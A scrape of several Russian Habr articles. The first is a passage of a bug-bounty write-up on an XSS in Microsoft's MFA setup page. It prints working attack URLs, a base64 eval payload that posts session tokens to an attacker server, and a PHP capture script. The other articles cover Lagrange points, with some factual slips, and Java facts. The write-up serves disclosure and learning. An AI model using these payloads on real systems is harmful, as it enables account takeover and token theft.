А что насчет кражи данных из localStorage/sessionStorage? Там почти ничего нельзя украсть.
Может, попробуем украсть значение PESTS? Но это ваш токен, а не жертвы. Приложение генерирует его на основе параметров, которые вы отправляете. Это означает, что он обычно принадлежит вам, а не жертве. Вместо того чтобы атаковать пользователей, вы просто раскрываете свой собственный токен. Гениальный ход!
Есть ли у нас токен жертвы? Нет. Украсть его? Никак. Можем ли мы сделать что-то значимое помимо этого? Большое жирное НЕТ.

Все признаки того, что нам чего-то нехватает! Время сделать шаг назад и убедиться, что я не упустил что-то важное.
Сделаем шаг назад!

Я потратил ещё некоторое время, просматривая историю Burp Suite, пока не заметил то, что изменило ход игры!
Внимательно посмотрите на вышеуказанный ответ — видите ли вы то, что вижу я? В, казалось бы, случайном запросе те же параметры добавляются к основному URL для входа!
Это заставило меня задуматься — хранит ли система входа Microsoft эти параметры и передает ли их уязвимой конечной точке, когда MFA отключен? Если это так, то мы нашли нечто важное. Это означало бы, что мы можем использовать данные извне — без необходимости в действительных значениях, чувствительных ко времени, и без работы с POST CSRF!
Точно! Я добавлю нашу нагрузку в конец параметра x-client-ver, как показано ниже:
https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fm365.cloud.microsoft%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=&ui_locales=en-US&mkt=en-US&client-request-id=ce8a562b-79d9-4150-8f97-f1a7b18b78e4&state=&x-client-SKU=ID_NET8_0&x-client-ver=7.5.1.0'injected='meloz'onfocus='alert(1)'tabindex='1'test='
Нас перенаправит на:
https://account.activedirectory.windowsazure.com/proofup.aspx?x-client-Ver=7.5.1.0%27injected%3d%27meloz%27onfocus%3d%27alert(1)%27tabindex%3d%271%27test%3d%27&x-client-SKU=ID_NET8_0&culture=en-US
Это именно то, что нам и надо. Но, к сожалению, уведомление не появилось! Это было ожидаемо, поскольку мы не включили фрагмент URL (id формы #registrationForm).
Поскольку URL для входа перенаправляет на другой источник, даже если мы добавим фрагмент URL, браузер не передаст его при перенаправлении. Это означает, что нам нужно найти альтернативный способ вызвать функцию focus() для формы.
Знаю о чем вы думаете, атрибут autofocus — это то, что нам нужно, правильно? Давайте посмотрим.
'injected='meloz'onfocus='alert(1)'autofocus=''tabindex='1'test='
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms[""registrationForm""].submit();'>
    <form action='https://served.from.server/path?brkrVer=8.0.1'
          injected='meloz' onfocus='alert(1)' autofocus='' tabindex='1'
          test='/theRest/Of/TheEndpoint' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
Когда я попробовал это в Chrome, все сработало отлично, но в Firefox это не сработало. Возможно, Firefox более осторожен с автоматическими отправками форм или отправками форм без взаимодействия с пользователем. Он может блокировать срабатывание события onfocus для вывода уведомления, когда форма автоматически отправляется (запомните это, мы вернемся к этому позже).
Как я упоминал ранее, чем больше пользователей мы затронем, тем больше будет поверхность атаки. Поэтому нам снова нужно сделать шаг назад и убедиться, что наша нагрузка работает во всех браузерах, чтобы максимизировать количество пользователей, которые могут быть затронуты этой уязвимостью.
Выбор правильного пути (Раунд 2)
В Firefox проблема заключается в автоматической отправке формы. Анализируя форму, я заметил, что наша нагрузку появляется до атрибутов id и name.
Так почему бы не добавить новый id и name, чтобы влезть в document.forms[""registrationForm""]?
Возьмем следующий пример — если мы добавим следующее:
'injected='meloz' id='melotover' name='melotover
<html>
  <body onload='document.forms[""registrationForm""].submit();'>
    <form action='https://served.from.server/path?brkrVer=8.0.1'
          injected='meloz' id='melotover' name='melotover' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
Что происходит, когда мы вызываем document.forms[""registrationForm""].submit();?
Результат: document.forms[""registrationForm""] становится неопределенным, что предотвращает автоматическую отправку формы. Теперь, если мы сделаем это на нашей целевой странице, как показано ниже, наш скрипт выполняется как задумано почти во всех браузерах!
'id='melotover'name='melotover'tabindex='1'onfocus='alert(document.domain)'autofocus=''test='
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms[""registrationForm""].submit();'>
    <form action='https://served.from.server/path?brkrVer=8.0.1'
          id='melotover' name='melotover' tabindex='1'
          onfocus='alert(document.domain)' autofocus=''
          test='/theRest/Of/TheEndpoint' method='POST'
          id='registrationForm' name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
Хорошо, скажем, мы хотим атаковать организацию под названием RealCompany. Если мы как-то найдем их {tenant-id}, мы можем передать этот уязвимый URL пользователям, работающим там:
https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fm365.cloud.microsoft%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=&x-client-SKU=ID_NET8_0&x-client-ver=80.0.1'id='melotover'name='melotover'tabindex='1'onfocus='alert(document.domain)'autofocus=''test='
{tenant-id} — это значение в формате UUID, которое трудно угадать. Однако можно найти множество таких значений через Google, Web Archive и другие источники. Более того, вместо того чтобы застревать на UUID, можно использовать домен, предоставленный Microsoft ({organizationName}.onmicrosoft.com), как мы обсуждали ранее. Кажется, что найти домен немного проще.
Идеально, если мы сможем расширить эту атаку не только на уровень всей организации или всего арендатора, но и нацелить наш уязвимый URL на ЛЮБОГО пользователя в ЛЮБОЙ организации.
Один важный момент, который я нашел в обучающих материалах Microsoft, заключается в том, что можно использовать несколько заранее определенных идентификаторов арендатора вместо /{tenant-id}/. Такие как:
/common/ → Любая учетная запись Microsoft (личная или рабочая/учебная)
/organizations/ → Только рабочие/учебные учетные записи (Azure AD)
/consumers/ → Только личные учетные записи Microsoft (например, Outlook)
/{tenant_id}/ → Конкретный Azure AD арендатор (по его ID или домену)
Мы можем использовать /common/, верно? Но вы можете спросить, как система входа определяет правильного арендатора в этом случае? Когда пользователь входит через, Azure AD извлекает домен из их электронной почты (например, melo@realcompany.com), чтобы идентифицировать соответствующий арендатор.
Если домен связан с Azure AD арендатором, система автоматически перенаправляет пользователя на страницу входа для этого арендатора.
Следовательно, мы можем отредактировать финальную нагрузку следующим образом:
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fm365.cloud.microsoft%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=&x-client-SKU=ID_NET8_0&x-client-ver=80.0.1'id='melotover'name='melotover'tabindex='1'onfocus='alert(document.domain)'autofocus=''test='
На данный момент, мы имеем уязвимость на уровне всей организации, которая затрагивает всех пользователей. Но это все еще просто XSS, и нам нужно найти способ использовать его с максимальной отдачей.
Расширяем воздействие
Учитывая, насколько чувствителен параметр PESTS — он играет ключевую роль в идентификации пользователей в системе MFA — мне пришла в голову мысль, что если мы украдем и повторно используем его, это может привести к чему-то более интересному.
Для тестирования я попытался войти с другой учетной записью. Когда пришло время использовать моё PESTS-значение, я заменил его на значение другого пользователя (назовем его User2), чтобы понаблюдать за поведением приложения. Результат? Произошла ошибка.
Затем, вместо того чтобы заменять только PESTS, я заменил все параметры, отправленные на /securityinfo, на значения User2. На этот раз, вместо возникновения ошибки, приложение перенаправило меня на страницу настройки MFA, позволяя мне добавить новый метод аутентификации как User2!
Невероятно.
Теперь начнем эксплуатацию.
Самый простой способ захватить все эти параметры — это изменить атрибут action формы на данные с нашего сервера, который обрабатывает входящие POST-запросы. Это гарантирует не только успешную отправку параметров на наш сервер, но и прервание процесса входа, сохранив токены действительными.
Но из-за некоторых проблем с кодированием я выбрал похожий способ. С помощью JavaScript я выберу все <input> теги на странице, закодирую и отправлю их на мой сервер.
Давайте разделим последовательность эксплуатации, чтобы вы не запутались:
Пользователь переходит по созданному нами уязвимому URL. После входа в систему его перенаправляет на уязвимую страницу (/proofup.aspx), где выполняется наша нагрузка.
Она собирает все теги <input>, содержащие чувствительные токены, кодирует их и отправляет на наш сервер — вместе с уникальным идентификатором конкретного пользователя.
Наш сервер декодирует полученные параметры, восстанавливает форму, идентичную той, что на уязвимой странице, и сохраняет её как файл. Имя файла соответствует уникальному идентификатору, который мы создали ранее.
Перейдя по этому файлу, нас перенаправляет на учетную запись жертвы, где мы можем добавить новый метод MFA.
Мы регистрируем свой собственный метод аутентификации. Теперь приложение распознает нас как авторизованного пользователя и перенаправляет нас на страницу настроек учетной записи.
На этом этапе мы имеем полный контроль над учетной записью жертвы.
Миссия выполнена!
Наша нагрузка:
content = btoa(document.forms[0].innerHTML);
f = document.createElement(""form"");
f.method = ""post"";
f.action = ""https://{YOUR_SERVER}/POC.php?userID="".concat(Date.now());
i = document.createElement('input');
i.name = ""data"";
i.value = content;
f.appendChild(i);
document.body.appendChild(f);
f.submit();
Из-за ограничений валидации ввода я закодировал нагрузку в Base64 и внедрил ее в атрибут rel. Затем вызвал его через обработчик события onfocus с использованием eval().
'id='melotover'name='melotover'rel='Y29udGVudD1idG9hKGRvY3VtZW50LmZvcm1zWzBdLmlubmVySFRNTCk7Zj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJmb3JtIik7Zi5tZXRob2Q9InBvc3QiO2YuYWN0aW9uPSJodHRwczovL3tZT1VSX1NFUlZFUn0vUE9DLnBocD91c2VySUQ9Ii5jb25jYXQoRGF0ZS5ub3coKSk7aT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpO2kubmFtZT0iZGF0YSI7aS52YWx1ZT1jb250ZW50O2YuYXBwZW5kQ2hpbGQoaSk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTtmLnN1Ym1pdCgpOw=='tabindex='1'autofocus=''onfocus='eval(atob(this.rel));//
В конце концов, вот конечный уязвимый URL:
https://login.microsoftonline.com/common/oauth2/authorize?client_id=0000000c-0000-0000-c000-000000000000&redirect_uri=https%3A%2F%2Faccount.activedirectory.windowsazure.com%2F&response_mode=form_post&response_type=code%20id_token&scope=openid%20profile&state=OpenIdConnect.AuthenticationProperties%&nonce=1736410058.168t6DgXvBr4QMXh3SLAeg&amr_values=ngcmfa&nux=1&x-client-SKU=ID_NET472&x-client-ver=8.0.1.0%27id=%27melotover%27name=%27melotover%27rel=%27Y29udGVudD1idG9hKGRvY3VtZW50LmZvcm1zWzBdLmlubmVySFRNTCk7Zj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJmb3JtIik7Zi5tZXRob2Q9InBvc3QiO2YuYWN0aW9uPSJodHRwczovL3tZT1VSX1NFUlZFUn0vUE9DLnBocD91c2VySUQ9Ii5jb25jYXQoRGF0ZS5ub3coKSk7aT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpO2kubmFtZT0iZGF0YSI7aS52YWx1ZT1jb250ZW50O2YuYXBwZW5kQ2hpbGQoaSk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTtmLnN1Ym1pdCgpOw==%27tabindex=%271%27autofocus=%27%27onfocus=%27eval(atob(this.rel));//
Вот серверный скрипт, который обрабатывает захват:
<?php

if (isset($_GET['userID'])
  && !empty($_GET['userID'])
  && ctype_digit($_GET['userID'])) {
    $filename = ""user_"" . $_GET['userID'];
}else{
  die(""Error"");
}

if ($_SERVER['REQUEST_METHOD'] === ""POST"") {
$data = file_get_contents(""php://input"");
!empty($data) && file_put_contents($filename, $data);
echo ""good luck!"";
}else{
$fileContent = file_get_contents($filename);
if (preg_match('/data=([A-Za-z0-9+\/=]+)/', $fileContent, $matches)) {
    $decodedValue = base64_decode($matches[1]);
    echo ""
      <!DOCTYPE html>
      <html lang='en'>
      <head>
          <meta charset='UTF-8'>
          <title>Dashboard</title>
      </head>
      <body>
      <div style='text-align:center'>
          <form id='hijack'
            action='https://account.activedirectory.windowsazure.com/securityinfo?isOobe=False&brkr=&brkrVer=8.0.1.0&clientSku=ID_NET472&personality=&authMethods=&authMethodCount='
            method='POST'>
              "" . $decodedValue . ""
          </form>
          <button onclick='document.forms.hijack.submit();' type='submit'>Hijack!</button>
          </div>
      </body>
      </html>"";
}}
?>
Я разобрался с этим — теперь пора отправить отчет в Microsoft!
Я знаю, что читать об эксплуатации — это одно, но увидеть это в действии — совсем другое. Поэтому я выложил видео с демонстрацией POC, чтобы вы могли посмотреть.
На следующий день после отправки отчета:
Я вернулся к эксплуатации с более амбициозной целью — нацелиться не только на пользователей, которые используют для входа только пароли, а на всех пользователей в целом!
Моя миссия? Сделать это для всего приложения!
Я экспериментировал с приложением, намеренно вызывая ошибки и наблюдая за его необычным поведением, и мне повезло.
Когда на уязвимый эндпоинт /proofup.aspx отправляется корректный запрос, приложение кэширует ответ, устанавливая cookie. В нем хранится сгенерированное значение PESTS. Этот кэшированный ответ остается действительным примерно 80 минут — столько же, сколько и срок действия cookie.
Когда страница кэшируется, даже при отправке простого GET-запроса на https://account.activedirectory.windowsazure.com/proofup.aspx приложение все равно возвращает тот же кэшированный ответ.
Почему это важно?
Это означает, что если я отправлю валидный запрос с XSS-нагрузкой, он будет выполнен. Более того, поскольку приложение кэширует весь ответ, все последующие запросы (GET или POST, независимо от того, истек ли срок действия тела запроса или нет) по-прежнему будут выполнять XSS-нагрузку.
Общий процесс эксплуатации
Атака CSRF создается с валидной формой, содержащей мои токены и XSS-нагрузку.
Приложение обрабатывает запрос, отвечает моим токеном PESTS, выполняет XSS и кэширует весь ответ в cookie.
Жертва (у которой включена двухфакторная аутентификация) вынуждена войти в систему и сразу перенаправляется на https://account.activedirectory.windowsazure.com/proofup.aspx.
Поскольку возвращается кэшированный ответ, XSS снова выполняется — но на этот раз она работает в контексте аутентифицированной сессии жертвы, а не моей.
Это создает проблему — как отправить форму, которая вызывает переход на главный уровень (top-level navigation), при этом перенаправляя пользователя на страницу входа?
Я придумал простой способ — когда мы отправляем форму на /proofup.aspx с нашим XSS, она выполняется, как и ожидалось, верно? Так почему бы не добавить простую строку в нашу нагрузку, чтобы перенаправить пользователя на страницу входа? Это может создать цикл, но вот в чем фишка: в первый раз скрипт выполняется, когда пользователь не авторизован; во второй раз — он авторизован!
Я упомянул это в своем ответе команде MSRC.
Таймлайн отчета:
11 января 2025: Сообщено о уязвимости команде MSRC.
12 января 2025: Предоставлены дополнительные замечания и POC.
14 января 2025: Команда MSRC подтвердила получение отчета и открыла дело.
5 февраля 2025: Команда MSRC подтвердила случай, реализовала исправление и начала рассмотрение для назначения награды.
6 февраля 2025: Получена награда.
Ещё больше познавательного контента в Telegram-канале — Life-Hack - Хакер"
Колонизация точек Лагранжа,https://habr.com/ru/articles/910384/,"Ранее в нескольких статьях я пытался рассуждать, почему при существующем уровне развития технологий колонизация других планет кажется от чрезвычайно опасной до бессмысленной при любом уровне техническ...","Ранее в нескольких статьях я пытался рассуждать, почему при существующем уровне развития технологий колонизация других планет кажется от чрезвычайно опасной до бессмысленной при любом уровне технических и финансовых вложений. Можно допустить создание долговременных баз на Марсе, а также приближение марсианских условий к земным по плану Джеймса Грина, описанному на Хабре здесь в блоге компании ItSoftWeb. Тем не менее, колонизация Марса, Венеры и Титана  — это крайне несхожие проекты, а у нас пока даже с колонизацией континентальной Антарктиды масса проблем. Зато мы умеем строить орбитальные станции, поэтому колонизация открытого космоса пока выглядит даже более перспективной, чем любое «мягкое терраформирование», граничащее с экологической катастрофой для того мира, в гомеостаз которого мы попробуем вмешаться.
Как я писал ранее, орбитальные станции вполне могут быть модульными и практически неограниченно достраиваться. Если такие технологии удастся развить, то едва ли не менее перспективными для долговременных космических поселений окажутся не планеты и спутники, а точки Лагранжа. Ниже поговорим о них подробнее.
Точки Лагранжа – это феномен небесной механики; также они называются «точками либрации». Они возникают из-за того, что в системе звезды и гораздо более мелких тел (спутников, планет, астероидов) любое обращение происходит не вокруг звезды как таковой, а вокруг общего центра масс. Несмотря на то, что в системе «Солнце – Земля» этот центр масс почти совпадает с самим Солнцем, в любой такой системе формируется ровно пять точек, в которых взаимное притяжение двух тел гасит друг друга, и достаточно мелкий объект (размером с десятки астероидов или большой город) может обращаться вокруг центра масс примерно с той же угловой скоростью, что и два массивных тела. В результате относительно двух этих объектов он останется практически неподвижен.   
Небесная механика точек Лагранжа
Центробежные силы возникают из-за того, что объект, придя в движение, стремится двигаться по прямой, а не по кругу. Вычисление центробежных сил — важный аспект решения «задачи трёх тел», над которой в конце XVII веке работал Жозеф Луи Лагранж. На Хабре есть подробнейшая статья уважаемого @belch84 «Задача трёх тел (не китайская нефантастика)», описывающая в контексте задачи трёх тел различные траектории космических аппаратов в системе «Земля – Луна». О существовании точек с таким орбитальным равновесием впервые догадался не Лагранж, а Леонард Эйлер. Он писал о «коллинеарных точках», которые расположены на одной линии и являются тремя из пяти точек Лагранжа. В системе вида «Солнце-Земля-Луна» насчитывается пять точек либрации.
Первая точка Лагранжа (L1) находится примерно на полпути между Землёй и Луной, но чуть ближе к Земле, поскольку Земля массивнее Луны. Если бы в этой точке находилась космическая станция, она повторяла бы фазы Луны, то есть, месяцы на ней были бы синодическими. Притом, что все орбитальные силы в точке Лагранжа обнуляются, это равновесие зыбкое. Если тело, будучи в точке Лагранжа, отклонится влево или вправо, то общее притяжение Земли, Луны и Солнца быстро вернёт его на место. Однако, если оно хотя бы немного сдвинется в сторону Земли или Луны, то притяжение планеты или спутника соответственно возобладает, и конструкция с ускорением упадёт на Землю или Луну.
Вторая и третья точки Лагранжа (L2 и L3) также расположены на прямой линии, соединяющей Землю и Луну, но L2 находится далеко за обратной стороной Луны, а L3 — на таком же расстоянии по другую сторону от Земли, то есть, в противоположном направлении. В этих двух точках взаимно обнуляются три силы: притяжение Луны, притяжение Земли и центробежная сила.
Насколько мы можем судить, точки L2 и L3 гораздо «шире», чем L1. В случае «соскальзывания» в сторону от точки L2 или L3 это легко было бы зафиксировать и включить двигатели, которые вернули бы аппарат или станцию в стабильное положение. Диаметр точек L2 и L3 составляет порядка 800 000 километров у каждой.
Тогда как точки L1, L2 и L3 можно считать условно стабильными, гораздо перспективнее выглядят точки L4 и L5. Обе они находятся в плоскости орбиты Земли и вращаются вместе с Землёй. Одна из этих точек обгоняет Землю на 60°, а другая запаздывает от неё на 60°. Вместе с Землёй эти точки находятся в вершинах двух равносторонних треугольников, вершинами каждого из которых являются Солнце, Земля и одна из точек Лагранжа. Вот как это проиллюстрировано в статье на сайте ""Постнаука"":
Как я ранее упоминал в статье «Астроинженерная фантазия о коорбитальных планетах», в точках Лагранжа L4 и L5 могли бы расположиться ещё две такие же планеты, как Земля, и, теоретически, подобную конструкцию можно было бы даже создать искусственно. Но, если буксировка планеты в заданную точку орбиты – это пока научно-фантастический сюжет, нет принципиальных препятствий, которые не позволяли бы расположить в точке Лагранжа орбитальную станцию.
Ньютон сформулировал законы тяготения и небесной механики в конце XVII века, обобщив и переосмыслив законы Кеплера. Одной из наиболее известных проблем небесной механики является гравитационная задача N тел, а также её частный случай – задача трёх тел. Она описывает гравитационное взаимодействие трёх тел в условиях взаимного притяжения и, естественно, применима к любым телам в точках Лагранжа. Задача трёх тел в общем виде была полнее всего исследована Анри Пуанкаре в конце XIX века, и Пуанкаре счёл, что общего решения она не имеет. Действительно, пока в общем виде задача трёх тел решена не математически, а только статистически. Частные решения для задачи трёх тел нашёл Леонард Эйлер в 1765 году. В задаче трёх тел мы имеем дело с системой координат для совместно вращающихся тел.
Показанная здесь система координат для совместно обращающихся объектов позволяет прослеживать перемещение точек Лагранжа относительно друг друга и относительно самих трёх тел.
Точные решения, предложенные Эйлером, позволяли определить положение точек L2 и L3. Поскольку L3 относительно Земли всегда находится по другую сторону от Солнца, в разное время существовали уфологические гипотезы о существовании «Контр-Земли» в этой точке – планеты, не менее пригодной для обитания, чем сама Земля, но надёжно скрытой от астрономических наблюдений. Такие представления были окончательно развенчаны лишь в ходе развития коронографов, но подтолкнули научный поиск в правильном направлении. По-видимому, крупные объекты не могут надолго задерживаться в точке L3, а вот точки L4 и L5 в перспективе очень пригодились бы нам для обустройства долговременных космических баз.
L4 и L5
В общих чертах создание долговременной колонии в точке Лагранжа уже сегодня не кажется нереализуемой. Если будет освоена добыча полезных ископаемых на астероидах, то нужные для разработки тела можно будет буксировать не к Земле, а в точку Лагранжа. Поскольку естественной гравитации там нет, на этапе строительства станции можно будет закладывать огромные конструкции (диаметром десятки километров), практически не учитывая сопротивления материалов. Искусственную гравитацию, аналогичную земной, на станции можно будет создать уже после её готовности, раскрутив такую конструкцию вокруг своей оси.
Такие проекты на стыке футурологии и научной фантастики озвучиваются с 1960-х годов. По-видимому, идею разместить крупную рукотворную структуру в точке либрации впервые высказал в 1961 году Артур Кларк в романе «Лунная пыль». При этом он рассматривал колонизацию точки L1. В 1945 году он впервые рассчитал точку, в которой можно было бы разместить такой искусственный спутник Земли, который совершал бы суточный оборот вокруг Земли за 24 часа и, соответственно, совпадал бы по этому показателю с самой планетой. Он описал этот проект в статье «EXTRA-TERRESTRIAL RELAYS Can Rocket Stations Give World-wide Radio Coverage?», рассматривая подобную станцию как радиолокатор, а не обитаемое поселение. Действительно, подобная орбита существует чисто математически. Например, международная космическая станция совершает оборот вокруг Земли примерно за полтора часа, а объект около Луны совершал бы примерно за месяц. По расчётам Кларка, «24-часовой оборот» совершал бы объект, расположенный на высоте около 38 000 километров над поверхностью Земли. Это и есть геостационарная орбита, на 2021 год на ней находилось около 500 действующих спутников.
 В 1975 году энтузиасты космонавтки Кит и Кэролин Хенсон основали «Общество L5». Эта организация быстро приобрела известность благодаря тому, что ею заинтересовался физик из Принстонского университета Джерард О’Нил, полемизировавший на тему создания цилиндрических космических поселений.
В уставе «Общества L5» было объявлено о том, что организация должна быть распущена на общем собрании членов на космической станции L5 — тем самым было бы признано, что миссия Общества выполнена. В 1987 году «Общество L5» влилось в состав Национального института космонавтики США.
Сегодня освоение точек Лагранжа L4 и L5 интересует преимущественно телекоммуникационные компании. Также эти точки являются приоритетными форпостами в случае появления космического оружия. Спутники, расположенные в L4 и L5, могли бы передавать сигнал одновременно и на Землю, и на Луну. Точки Лагранжа — более спокойные места, чем даже геостационарная орбита, в них не так строги требования к удержанию станции в точке стояния. Кроме того, уже сейчас на геостационарной орбите становится слишком тесно, поэтому в течение XXI века развёртывание новых спутников придётся начать в точках Лагранжа — хотя бы в L1. В настоящее время L4 и L5 рассматриваются как районы размещения систем по позиционированию, навигации и синхронизации (PNT), а также платформ для патрулирования геостационарной орбиты  (SSA). Кроме того, в L4 и L5 можно было бы устанавливать космические обсерватории для раннего оповещения о магнитных бурях и о приближении астероидов.
Естественно, такая гравитационная стабильность привела к тому, что в точках Лагранжа уже сейчас полно космического мусора (естественного происхождения). На геосинхронной орбите из-за взаимного притяжения действующих и отработанных спутников уже сейчас возникают так называемые «геопотенциальные колодцы». Аналогичный феномен наблюдается и в точках L4 и L5, потому, что в этих районах скопилось множество мелких камней, космической пыли и осколков астероидов. Ранее на Хабре об этом упоминал уважаемый @Albireo сравнивший точку Лагранжа с «космической липучкой для мух». Современные телескопы позволили выявить скопления естественного космического мусора в точках L1, L4 и L5, названные «облаками Кордылевского» в честь польского учёного Казимежа Кордылевского, спрогнозировавшего их существование в 1956 году. Однозначно подтвердить существование таких облаков в точках L4 и L5 удалось только в 2018 году. Подтверждение было получено в частной венгерской обсерватории под руководством Юдита Слиз-Балога — это означает, что у Земли есть не менее двух пылевых спутников около 10 000 километров в поперечнике каждый. Облако в районе L5 выглядит стабильным и древним, но проанализировать примерный размер осколков в нём пока сложно, так как облака очень тусклые. С одной стороны, такие облака могут быть очень опасны для долговременных станций в точках Лагранжа. С другой стороны, подобные облака должны облегчать поиск точек Лагранжа поблизости от других планет Солнечной системы, и поэтому заслуживают дополнительного изучения. По-видимому, такие облака сформировались в системах Солнце-Нептун (троянские астероиды Нептуна) и Солнце-Марс (троянские астероиды Марса).
Что сейчас находится в точках Ланранжа
Список объектов, находящихся в точках Лагранжа приведён в Википедии. Пока осваиваются только ближайшие к Земле точки (L1 и L2), но здесь остановлюсь на них подробнее. В настоящее время в точках Лагранжа в системах Земля — Луна и Земля — Солнце накапливается внушительный набор оборудования, и искусственные спутники в этих районах явно более заметны, чем космическая пыль. Итак.
В точке L1 находятся:
Солнечная и гелиосферная обсерватория (SOHO, ESA), выведена в L1 в 1996 году
Advanced Composition Explorer (ACE, NASA) – аппарат для исследования солнечного ветра и прочих высокоэнергетических частиц, выведен в L1 в 1997 году
Аппарат «Wind» (GGS, NASA), находился на орбите вокруг L1 в 1996 году, затем маневрировал для выхода из плоскости эклиптики, в 2004 году благополучно вернулся в L1
Климатическая обсерватория «Дискавери» (DSCOVR, NOAA), предназначенная для космических метеорологических наблюдений и впервые позволившая получить фотографию полной Луны на фоне полной Земли
Индийский спутник Адитья-L1 (ISRO)
К ним должна присоединиться космическая обсерватория IMAP, запуск которой намечен в сентябре 2025 года, а также аппараты SWFO-L1 и NEO Surveyor, которые должны начать работу в 2027 году. Научные задачи этих аппаратов — космическая съёмка Земли, изучение солнечного ветра, наблюдение за земной погодой из космоса. При этом большинство аппаратов не являются стационарными, а обращаются вокруг точки Лагранжа по орбите в форме фигуры Лиссажу. Такое движение позволяет не только увеличить область обзора спутника, но и справиться с гравитационной нестабильностью, из-за которой объекты постепенно выскальзывают из околоземных точек L1-L3.
Подробнее о движении по орбитам Лиссажу рассказано здесь.
В точке L2 между Солнцем и Землёй сейчас находятся:
Космическая обсерватория Gaia (ESA)
Астрофизическая обсерватория Спектр-РГ для анализа рентгеновского и гамма-спектра (российско-немецкий проект)
Космический телескоп «Джеймс Уэбб» (JWST, NASA, ESA, CSA)
Космический телескоп Евклид (ESA), предназначенный для поисков тёмной материи и тёмной энергии
Кроме того, эти аппараты сейчас дают массу информации о движении комет и открывают экзопланеты.  
Перспективы
Точки Лагранжа L4 и L5 пока целенаправленно не осваиваются. Мимо них проходили траектории космических аппаратов «OSIRIS-Rex» и «Хаябуса». Европейское космическое агентство планирует в 2031 году запустить аппарат Vigil, который будет выведен в точку Лагранжа L5. Он должен будет наблюдать за солнечными факелами, корональными выбросами массы на Солнце, геомагнитными бурями и прочими явлениями гелиофизики. Также остаётся актуальной перспектива развёртывания релейных передатчиков в точках Лагранжа, о чём я упоминал выше.
В 2012 году озвучивались планы NASA по развёртыванию пилотируемой космической станции в точке L2. Станция имела рабочее название «Gateway Spacecraft», и о ней подробно рассказано здесь. Для привлечения внимания покажу лишь её общий вид:
Поскольку точка L2 расположена за обратной стороной Луны, предполагалось, что такая станция могла бы упростить наблюдение за не видимым с Земли лунным полушарием, помочь с исследованием астероидов и послужить перевалочным пунктом на пути к Марсу. Тем не менее, проект сейчас выглядит заброшенным, так как при нынешнем уровне развития техники было бы сложно обеспечить снабжение такой станции, а буксировка астероидов к станции или к Земле остаётся в области фантастики как с научной, так и с промышленной точки зрения. Более вероятно, что первая лунная обитаемая станция будет построена на самом спутнике, а не близ его орбиты.
Несмотря на все сложности, точки Лагранжа кажутся наиболее удобными форпостами для освоения Солнечной системы — вероятно, только для беспилотного. Точки L4 и L5 находятся далеко за пределами земной магнитосферы, поэтому их обитатели-колонисты при нынешнем уровне техники оказались бы беззащитны перед потоками солнечного ветра. Кроме того, солнечные вспышки могли бы надолго обрывать связь с такими дальними колониями, что с высокой вероятностью ставило бы крест на их работе. Но точки Лагранжа в любой системе планет или спутников — это тихие гавани с хорошо известными и прогнозируемыми свойствами, поэтому можно не сомневаться, что осваивать их будет проще, чем планеты или спутники. Особенно интересны многочисленные точки Лагранжа, которые должны существовать между спутниками планет-гигантов; именно из них и было бы наиболее удобно изучать Юпитер и Сатурн."
Что вы знаете о Яве?,https://habr.com/ru/companies/axiomjdk/articles/909892/,"23 мая этого года языку Java исполняется 30 лет. В честь этой круглой даты мы с коллегами сделали подборку интересных фактов, с этим языком связанных. Иногда самым неожиданным образом.
Ява — это остро...","23 мая этого года языку Java исполняется 30 лет. В честь этой круглой даты мы с коллегами сделали подборку интересных фактов, с этим языком связанных. Иногда самым неожиданным образом.
Ява — это остров
В одной из самых ранних книг по Java, году в 2000, я прочитал, что Java назван в честь острова в Индийском океане. Ну остров и остров. Вот он на карте:
Остров Ява, © Google Maps
Недалеко от экватора, много воды, тепла, есть действующие вулканы, а значит все в порядке с питательными веществами для растений. Должно все расти. Вроде бы как и на других островах региона.
Но впечатлило не это. По площади остров Ява сравним с Омской областью России — 132 023 км² острова Ява против 141 140 км² Омской области.
Омская область России, © Google Maps
А вот народа живет там чуть больше, чем в России — 156 млн. человек!
На территории в 0.82% от территории России живет больше людей, чем у нас в стране, это самый густонаселенный остров в мире!
Благодаря своему расположению и близости к экватору, на острове очень хорошо все растет, поэтому там развито сельское хозяйство. Вот неполный список того, что на острове выращивают:
рис
кукуруза
арахис
соя
батат
кофе
табак
сахарный тростник
На острове добывают нефть и газ, есть развитая промышленность. На острове очень много исторических памятников, включая храмовый комплекс Боробудур.
Кроме того, остров Ява является важным логистическим узлом.
Но вернемся к теплому и мокрому, к растениям.
Ява — это кофе
В 1699 году (по другим данным в 1701 году) голландцы завезли из Индии кофе на острова Ява, Бали и Суматру. Там он растет до сих пор.
Зерна кофе Java. © tastycoffee.ru
